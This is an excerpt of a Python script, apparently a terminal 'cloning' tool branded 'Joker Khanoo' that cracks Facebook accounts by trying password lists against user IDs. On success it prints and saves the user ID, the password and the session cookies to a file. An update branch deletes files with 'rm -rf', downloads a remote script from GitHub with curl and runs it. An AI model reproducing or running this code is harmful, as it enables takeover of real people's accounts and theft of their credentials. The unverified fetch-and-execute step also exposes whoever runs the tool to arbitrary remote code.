...
fbks=('m.facebook','com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
...
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[\033[1;33m[•] 𝐀𝐔𝐓𝐇𝐎𝐓   \33[0;m:\033[1;35m 𝐌𝐑 𝐉𝐎𝐊𝐄𝐑 𝐊𝐇𝐀𝐍𝐎𝐎 \033[1;36m𝐇𝐀𝐉𝐈
╠══[\033[1;32m[•] 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 \033[1;32m:\033[1;32m 𝐀𝐅𝐆𝐇𝐀𝐍𝐈𝐒𝐓𝐀𝐍 𝐇𝐀𝐂𝐊𝐄𝐑\033[1;33m𝐉𝐎𝐊𝐄𝐑
╠══[\033[1;35m[•] 𝐓𝐄𝐀𝐌 \033[1;34m    :\033[1;33m 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑 𝐊𝐇𝐀𝐍𝐎𝐎
╠══[\033[1;34m[•] 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 \033[1;32m:\033[1;34m𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑 𝐊𝐇𝐀𝐍𝐎𝐎
╠══[\033[1;33m[•] 𝐒𝐓𝐀𝐓𝐔𝐒\033[1;33m   :\033[1;31m 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑 𝐊𝐇𝐀𝐍𝐎𝐎\33[1;37m
╠══[\033[1;32m[•] 𝐕𝐄𝐑𝐒𝐈𝐎𝐍  : 0.8
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;37m""")
...
try:
    ...
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/Random.py > Random.py')
        os.system('python Random.py')
    else:pass
...
def barie():
    os.system('clear')
    print(logo)
    print(' [1] 𝐂𝐑𝐄𝐀𝐓𝐄 𝐅𝐈𝐋𝐄 \33[1;32m(𝐃𝐔𝐌𝐏)\33[1;37m')
    print(' [2] 𝐑𝐎𝐍𝐃𝐎𝐌 𝐂𝐋𝐎𝐍𝐈𝐍𝐆')
    print(' [0] 𝐄𝐗𝐈𝐓')
    lines()
...
def riaz():
	os.system('clear')
	print(logo)
	print('[1] 𝐀𝐅𝐆𝐇𝐀𝐍 𝐂𝐋𝐎𝐍𝐈𝐍𝐆')
	print('[2] 𝐏𝐀𝐊𝐈𝐒𝐓𝐀𝐍 𝐂𝐋𝐎𝐍𝐈𝐍𝐆')
	print('[3] 𝐅𝐎𝐋𝐋𝐎𝐖 𝐌𝐘 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌')
	print('[0]\x1b[1;91m 𝐄𝐗𝐈𝐓')
	lines()
...
def bangla():
	os.system('clear')
	print(logo)
	print('[1] 𝐏𝐀𝐊 𝐂𝐑𝐀𝐂𝐊 _𝐌 1')
	print('[2]  𝐏𝐀𝐊 𝐂𝐑𝐀𝐂𝐊 _𝐌 2')
	print('[3]\x1b[1;91m 𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔')
	lines()
	riaz1 = input('[+] SELECT OPTION : ')
	if riaz1 =='1':
		b1()
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r[\033[1;97mBM-𝐉𝐎𝐊𝐄𝐑\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[𝐉𝐎𝐊𝐄𝐑-OK] '+uid+' | '+ps+'\n\033[1;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
                open('𝐉𝐎𝐊𝐄𝐑-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('[𝐉𝐎𝐊𝐄𝐑-CP] '+uid+' | '+ps+'\x1b[1;97m')
